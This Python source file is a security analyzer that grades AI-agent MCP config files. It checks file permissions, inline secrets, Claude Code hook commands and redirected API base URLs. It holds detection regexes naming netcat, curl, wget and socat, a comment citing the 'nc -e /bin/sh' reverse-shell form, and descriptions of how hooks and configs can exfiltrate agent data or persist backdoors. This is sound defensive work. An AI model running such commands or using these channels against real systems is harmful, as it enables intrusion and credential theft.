"""Grade MCP config files for filesystem security hygiene.

This analyzer checks the *file* itself — permissions, parent-directory
write-access, and inline vs. env-var secret storage — rather than the
parsed server contents (credentials.py handles that layer).

Motivation: on 2026-04-22 supply-chain malware embedded in the Bitwarden
npm package explicitly targeted ``~/.claude.json``, ``~/.claude/mcp.json``,
and ``~/.kiro/settings/mcp.json`` as its primary credential-cache targets.
mcp-audit's ``discover`` command already knows exactly where all 8 supported
clients store their configs; this analyzer grades each file's exposure.

**Hook analysis (HOOK-001, HOOK-002)** was added as part of the agent-file
scanner (2026-06-14).  Claude Code executes hook commands at lifecycle events
(``preToolUse``, ``postToolUse``, ``stop``, etc.); these checks fire on the
`hooks` section of *any* claude-client config file, not just the user-global
``.claude.json``.
"""

from __future__ import annotations

import json
import logging
import os
import re
import stat as stat_module
from pathlib import Path

from mcp_audit.analyzers.base import BaseAnalyzer
from mcp_audit.analyzers.credentials import SECRET_PATTERNS
from mcp_audit.models import Finding, ServerConfig, Severity

logger = logging.getLogger(__name__)

# ── Hook-command analysis patterns ────────────────────────────────────────────

# HOOK-001: network egress commands/URLs inside hook command strings.
# Matches curl, wget, nc/ncat (netcat), socat, Python urllib/requests one-liners,
# PowerShell Invoke-WebRequest, and raw http(s):// URLs.
#
# The ``nc`` clause matches any netcat invocation that carries an argument
# (``\bnc\s+\S``).  An earlier ``(?!-[a-z])`` look-ahead was removed because it
# silently excluded the most dangerous form — the ``nc -e /bin/sh <host> <port>``
# reverse shell — while still matching benign-looking host-form invocations.
# In an agent lifecycle hook there is no legitimate use of netcat, so matching
# every ``nc <arg>`` form closes that false-negative without adding noise.
_HOOK_NETWORK_RE: re.Pattern[str] = re.compile(
    r"(?i)\b(curl|wget|ncat|socat|Invoke-WebRequest|Invoke-RestMethod)\b"
    r"|https?://[^\s\)\"\']{8,}"
    r"|\bpython\b.{0,60}\b(urllib|requests|http\.client)\b"
    r"|\bnc\s+\S",
    re.IGNORECASE,
)

# HOOK-002: hook command writes to / references agent config file paths.
# Covers the most common MCP config file locations across all 8 supported clients.
_HOOK_CONFIG_WRITE_RE: re.Pattern[str] = re.compile(
    r"(?i)"
    r"\.claude\.json|claude_desktop_config\.json"
    r"|\.cursor[/\\]mcp\.json|\.cursor[/\\]settings\.json"
    r"|\.kiro[/\\]settings[/\\]mcp\.json"
    r"|\.vscode[/\\]mcp\.json"
    r"|\.codeium[/\\]windsurf[/\\]mcp[/_]server_config\.json"
    r"|Library[/\\]Application Support[/\\](Claude|claude)"
    r"|AppData[/\\]Roaming[/\\](Claude|claude)"
)

# ── Env-var reference patterns ────────────────────────────────────────────────

# Env-var reference patterns: ${VAR}, $VAR, %(VAR)s, %VAR%
_ENV_REF_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"\$\{[A-Za-z_][A-Za-z0-9_]*\}"),  # ${VAR}
    re.compile(r"\$[A-Za-z_][A-Za-z0-9_]+"),  # $VAR (2+ chars after $)
    re.compile(r"%\([A-Za-z_][A-Za-z0-9_]*\)s"),  # %(VAR)s
    re.compile(r"%[A-Za-z_][A-Za-z0-9_]*%"),  # %VAR% (Windows style)
]


def _looks_like_env_ref(value: str) -> bool:
    """Return True when *value* is an env-var reference, not a literal secret."""
    return any(pat.search(value) for pat in _ENV_REF_PATTERNS)


class ConfigHygieneAnalyzer(BaseAnalyzer):
    """Grade MCP config files for filesystem security hygiene.

    Checks performed per server (via its ``config_path``):

    - **CFHYG-001**: config file is world-readable (POSIX o+r).
    - **CFHYG-002**: any ancestor directory up to ``$HOME`` is world-writable.
    - **CFHYG-003**: config file stores a plaintext secret inline.
    - **CFHYG-004**: config file uses env-var references for all credentials
      (positive signal — reinforces correct behaviour).
    - **CFHYG-005**: any Claude client config file contains a non-empty
      ``hooks`` section (CVE-2025-59536 — shell-command injection).
    - **CFHYG-006**: server env sets ``ANTHROPIC_BASE_URL`` to a non-Anthropic
      domain (CVE-2026-21852 — API traffic exfiltration).
    - **HOOK-001**: a hook command contains network-egress primitives (curl,
      wget, nc, socat, raw HTTP(S) URL, etc.), enabling data exfiltration or
      C2 callback via the agent lifecycle.
    - **HOOK-002**: a hook command references an MCP/agent config file path,
      the CVE-2026-30615 persistence channel (write-to-config-and-survive).

    Permission checks (CFHYG-001, CFHYG-002) are skipped on Windows because
    POSIX ``st_mode`` bits do not represent Windows ACL semantics.
    Windows ACL checking via ``pywin32`` / ``icacls`` is out of scope (TODO).
    """

    @property
    def name(self) -> str:
        return "config_hygiene"

    @property
    def description(self) -> str:
        return (
            "Grade MCP config files for filesystem hygiene: permissions,"
            " directory write-access, and inline vs. env-var secret storage"
        )

    def analyze(self, server: ServerConfig) -> list[Finding]:
        """Inspect *server*'s config file for hygiene issues.

        Args:
            server: The MCP server configuration to analyze.

        Returns:
            List of hygiene findings.  Empty list when no issues are detected
            or the config file cannot be accessed.
        """
        findings: list[Finding] = []

        config_path = server.config_path.resolve()

        try:
            file_stat = config_path.stat()
        except FileNotFoundError:
            logger.debug("config_hygiene: config file not found: %s", config_path)
            return []
        except PermissionError:
            logger.debug(
                "config_hygiene: permission denied reading stat for: %s", config_path
            )
            return []

        if os.name == "nt":
            # TODO: implement Windows ACL checking via pywin32 or icacls.
            logger.debug(
                "config_hygiene: POSIX permission checks skipped on Windows for %s",
                config_path,
            )
        else:
            findings.extend(self._check_world_readable(server, config_path, file_stat))
            findings.extend(self._check_world_writable_parent(server, config_path))

        findings.extend(self._check_inline_secrets(server, config_path))
        findings.extend(self._check_anthropic_base_url(server))

        return findings

    # ── private helpers ──────────────────────────────────────────────────────

    def _check_world_readable(
        self,
        server: ServerConfig,
        config_path: Path,
        file_stat: os.stat_result,
    ) -> list[Finding]:
        """CFHYG-001 — config file is world-readable (o+r bit set)."""
        if not (file_stat.st_mode & stat_module.S_IROTH):
            return []
        return [
            Finding(
                id="CFHYG-001",
                severity=Severity.HIGH,
                analyzer=self.name,
                client=server.client,
                server=server.name,
                title="Config file is world-readable",
                description=(
                    "The MCP config file has world-readable permissions. "
                    "Any process running on this machine — including supply-chain "
                    "malware — can read credentials embedded in the file. "
                    "The Bitwarden npm incident (2026-04-22) explicitly targeted "
                    "these files as its primary credential-cache."
                ),
                evidence=f"Config file permissions: {oct(file_stat.st_mode)}",
                remediation=f"Run: chmod 600 {config_path}",
                cwe="CWE-732",
                owasp_mcp_top_10=["MCP01"],
            )
        ]

    def _check_world_writable_parent(
        self,
        server: ServerConfig,
        config_path: Path,
    ) -> list[Finding]:
        """CFHYG-002 — any ancestor directory up to $HOME is world-writable."""
        try:
            home = Path.home()
        except RuntimeError:
            home = None

        candidate = config_path.parent
        while True:
            try:
                dir_stat = candidate.stat()
            except (PermissionError, OSError):
                break

            if dir_stat.st_mode & stat_module.S_IWOTH:
                return [
                    Finding(
                        id="CFHYG-002",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=server.client,
                        server=server.name,
                        title="Config file is in a world-writable directory",
                        description=(
                            f"Parent directory {candidate} is world-writable. "
                            "Any process on this machine can replace the config "
                            "file — a filesystem-level rug-pull. /tmp is the "
                            "canonical case; supply-chain malware actively "
                            "exploits this to inject malicious server definitions "
                            "(Bitwarden incident, 2026-04-22)."
                        ),
                        evidence=f"Parent directory {candidate} is world-writable",
                        remediation=(
                            "Move the config file to a directory with restricted"
                            " write permissions (e.g., your home directory at"
                            f" mode 700): {home or '~'}"
                        ),
                        cwe="CWE-732",
                        owasp_mcp_top_10=["MCP01", "MCP09"],
                    )
                ]

            # Stop climbing once we reach home or the filesystem root.
            if home is not None and candidate == home:
                break
            parent = candidate.parent
            if parent == candidate:
                # Filesystem root — stop.
                break
            candidate = parent

        return []

    def _check_inline_secrets(
        self,
        server: ServerConfig,
        config_path: Path,
    ) -> list[Finding]:
        """CFHYG-003 / CFHYG-004 — inline secrets vs. env-var references."""
        if not server.env:
            # No env entries — nothing to grade.
            return []

        has_secret = False
        all_env_refs = True  # tracks whether every *non-empty* value is a ref

        for value in server.env.values():
            if not value:
                # Empty string — neutral; don't count against env-ref score.
                continue
            matched_secret = any(pat.search(value) for _, pat, _ in SECRET_PATTERNS)
            if matched_secret:
                has_secret = True
                all_env_refs = False
                break
            if not _looks_like_env_ref(value):
                all_env_refs = False

        if has_secret:
            return [
                Finding(
                    id="CFHYG-003",
                    severity=Severity.HIGH,
                    analyzer=self.name,
                    client=server.client,
                    server=server.name,
                    title="Config file stores a plaintext secret inline",
                    description=(
                        "Config file stores a plaintext secret inline — this "
                        "file is a high-value target for supply-chain malware "
                        "(Bitwarden incident 2026-04-22). Any process on this "
                        "machine with read access to the config file can harvest "
                        "the credential without further privilege escalation."
                    ),
                    evidence=(
                        f"One or more env values in server '{server.name}' match"
                        " a known secret pattern"
                    ),
                    remediation=(
                        "Replace inline secrets with environment variable "
                        "references (e.g., ${MY_API_KEY}) and export the actual "
                        "value from a credential manager or shell profile."
                    ),
                    cwe="CWE-312",
                    owasp_mcp_top_10=["MCP01"],
                )
            ]

        if all_env_refs:
            return [
                Finding(
                    id="CFHYG-004",
                    severity=Severity.INFO,
                    analyzer=self.name,
                    client=server.client,
                    server=server.name,
                    title=(
                        "Config uses environment variable references for"
                        " credentials (good practice)"
                    ),
                    description=(
                        "No plaintext secrets found; credentials appear to be "
                        "passed via environment variable references."
                    ),
                    evidence=(
                        f"All env values for server '{server.name}' use"
                        " env-var reference syntax (e.g., ${{VAR}}, $VAR,"
                        " %(VAR)s)"
                    ),
                    remediation="No action required — this is the recommended pattern.",
                    cwe=None,
                    owasp_mcp_top_10=["MCP01"],
                )
            ]

        return []

    def _load_raw_config(self, config_path: Path) -> dict | None:
        """Read and parse *config_path* as JSON, returning ``None`` on any failure."""
        try:
            with config_path.open(encoding="utf-8") as fh:
                return json.loads(fh.read())
        except Exception:
            logger.debug("config_hygiene: failed to parse JSON from %s", config_path)
            return None

    # ── Hook helpers ──────────────────────────────────────────────────────────

    @staticmethod
    def _is_claude_code_config(config_path: Path) -> bool:
        """Return True when the config file is a Claude Code hooks-capable config.

        Hooks are a Claude Code feature, not Claude Desktop.  Only three file
        locations can contain a ``hooks`` section:

        - ``~/.claude.json`` (user-global)
        - ``.claude/settings.json`` (project-level)
        - ``.claude/settings.local.json`` (project-level)
        """
        if config_path.name == ".claude.json":
            return True
        if config_path.name in ("settings.json", "settings.local.json"):
            return config_path.parent.name == ".claude"
        return False

    @staticmethod
    def _extract_hook_commands(hooks: dict) -> list[str]:
        """Flatten a Claude Code ``hooks`` dict into a list of command strings.

        The hooks dict looks like:
        ``{"PreToolUse": [{"hooks": [{"type": "command", "command": "..."}]}]}``

        Returns:
            All ``"command"`` values found at any nesting depth.
        """
        commands: list[str] = []
        if not isinstance(hooks, dict):
            return commands
        for _event, hook_groups in hooks.items():
            if not isinstance(hook_groups, list):
                continue
            for group in hook_groups:
                if not isinstance(group, dict):
                    continue
                for hook in group.get("hooks") or []:
                    if isinstance(hook, dict) and hook.get("type") == "command":
                        cmd = hook.get("command")
                        if isinstance(cmd, str) and cmd.strip():
                            commands.append(cmd)
        return commands

    def _check_hook_commands(
        self,
        hooks: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """HOOK-001 and HOOK-002: inspect hook command strings for risky patterns.

        Args:
            hooks: The ``hooks`` dict from the parsed config file.
            config_path: Filesystem path to the config file (for evidence context).
            client: Client name from the discovered config.

        Returns:
            List of HOOK-001/002 findings.
        """
        commands = self._extract_hook_commands(hooks)
        findings: list[Finding] = []
        seen_ids: set[str] = set()

        for cmd in commands:
            # HOOK-001: network egress
            m = _HOOK_NETWORK_RE.search(cmd)
            if m and "HOOK-001" not in seen_ids:
                seen_ids.add("HOOK-001")
                findings.append(
                    Finding(
                        id="HOOK-001",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=client,
                        server="(hook)",
                        title="Hook command contains network-egress instruction",
                        description=(
                            f"A hook command in '{config_path.name}' contains a"
                            " network-egress primitive (curl, wget, nc, socat, HTTP"
                            " URL, etc.). Claude Code executes hook commands during"
                            " its lifecycle (preToolUse, postToolUse, stop, etc.)."
                            " A hook that calls out to the network can exfiltrate"
                            " conversation content, credentials, or tool outputs to"
                            " an attacker-controlled server."
                        ),
                        evidence=f"Command: {cmd[:120]!r}",
                        remediation=(
                            "Remove the network-egress instruction from the hook"
                            " command. Hook commands should be limited to local"
                            " operations. Review all hooks for commands you did not"
                            " add intentionally."
                        ),
                        cwe="CWE-78",
                        owasp_mcp_top_10=["MCP05", "MCP07"],
                    )
                )

            # HOOK-002: writes to / references agent config files
            m2 = _HOOK_CONFIG_WRITE_RE.search(cmd)
            if m2 and "HOOK-002" not in seen_ids:
                seen_ids.add("HOOK-002")
                findings.append(
                    Finding(
                        id="HOOK-002",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=client,
                        server="(hook)",
                        title="Hook command references agent config file path",
                        description=(
                            f"A hook command in '{config_path.name}' references"
                            " an MCP or agent config file path. This matches the"
                            " CVE-2026-30615 persistence pattern: a hook that"
                            " modifies another agent config file can inject new"
                            " servers or hooks that survive configuration resets,"
                            " establishing a persistent backdoor."
                        ),
                        evidence=f"Command: {cmd[:120]!r}",
                        remediation=(
                            "Remove the hook command that references agent config"
                            " file paths. Hook commands should never modify other"
                            " config files. Review all hooks for commands you did"
                            " not add intentionally."
                        ),
                        cwe="CWE-78",
                        cve=["CVE-2026-30615"],
                        owasp_mcp_top_10=["MCP05", "MCP07"],
                    )
                )

        return findings

    def analyze_config(
        self,
        raw: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """Config-level hygiene checks that run even when no servers are configured.

        Called once per config file by the scanner pipeline, independent of how
        many (if any) MCP servers the file defines.

        Currently covers:

        - **CFHYG-005**: non-empty ``hooks`` section in any Claude client config
          file (CVE-2025-59536 — shell-command injection via config file write).
          Covers ``~/.claude.json``, ``.claude/settings.json``, and
          ``.claude/settings.local.json``.
        - **HOOK-001**: hook command contains network-egress primitives.
        - **HOOK-002**: hook command references an agent config file path
          (CVE-2026-30615 persistence channel).

        Args:
            raw: The parsed JSON dict for the config file.
            config_path: Filesystem path to the config file.
            client: Client name from the discovered config (e.g. ``"claude-code"``).

        Returns:
            List of config-level findings.  Empty when no issues are detected.
        """
        findings: list[Finding] = []
        if not self._is_claude_code_config(config_path):
            return findings

        hooks = raw.get("hooks")
        if not hooks:
            return findings

        # CFHYG-005: presence of any hooks section
        findings.append(
            Finding(
                id="CFHYG-005",
                severity=Severity.MEDIUM,
                analyzer=self.name,
                client=client,
                server="(config-level)",
                title="Claude Code hooks section detected in config",
                description=(
                    f"The config file '{config_path.name}' contains a non-empty"
                    " 'hooks' section. Claude Code executes hooks as shell"
                    " commands during its lifecycle (pre-tool, post-tool,"
                    " etc.). A threat actor with write access to this file"
                    " can inject arbitrary commands that run with your user"
                    " privileges during normal Claude Code operation."
                    " (CVE-2025-59536, Check Point Research)"
                ),
                evidence=(
                    f"Config file {config_path} contains a non-empty 'hooks' section"
                ),
                remediation=(
                    f"Review the 'hooks' section in {config_path.name}. Remove any"
                    " hooks you did not intentionally add. Restrict write"
                    f" access to the file: chmod 600 {config_path}"
                ),
                cwe="CWE-78",
                cve=["CVE-2025-59536"],
                owasp_mcp_top_10=["MCP01", "MCP07"],
            )
        )

        # HOOK-001/002: inspect individual hook commands for risky patterns
        findings.extend(self._check_hook_commands(hooks, config_path, client))
        return findings

    def _check_anthropic_base_url(
        self,
        server: ServerConfig,
    ) -> list[Finding]:
        """CFHYG-006 — ``ANTHROPIC_BASE_URL`` set to a non-Anthropic domain.

        CVE-2026-21852 (Check Point Research): Claude Code respects this
        variable as the API base URL, so a non-Anthropic value redirects all
        API traffic — including the user's API key and full conversation
        content — to an attacker-controlled server.
        """
        if not server.env:
            return []

        value = server.env.get("ANTHROPIC_BASE_URL")
        if not value:
            return []

        if _looks_like_env_ref(value):
            return []

        if value.startswith("https://api.anthropic.com"):
            return []

        return [
            Finding(
                id="CFHYG-006",
                severity=Severity.MEDIUM,
                analyzer=self.name,
                client=server.client,
                server=server.name,
                title="ANTHROPIC_BASE_URL overrides Anthropic API endpoint",
                description=(
                    f"Server '{server.name}' sets ANTHROPIC_BASE_URL to a"
                    " non-Anthropic domain. Claude Code respects this"
                    " variable as the API base URL — all API calls,"
                    " including those carrying your API key and full"
                    " conversation content, will be routed to the configured"
                    " domain instead of api.anthropic.com. This is the"
                    " exfiltration vector in CVE-2026-21852"
                    " (Check Point Research)."
                ),
                evidence=(f"ANTHROPIC_BASE_URL={value!r} in server '{server.name}'"),
                remediation=(
                    "Remove or verify the ANTHROPIC_BASE_URL setting in this"
                    " server's env. If it must be set, ensure it points to"
                    " https://api.anthropic.com (or a legitimate Anthropic"
                    " endpoint). Rotate your Anthropic API key if this"
                    " setting was unexpected."
                ),
                cwe="CWE-441",
                cve=["CVE-2026-21852"],
                owasp_mcp_top_10=["MCP01", "MCP08"],
            )
        ]
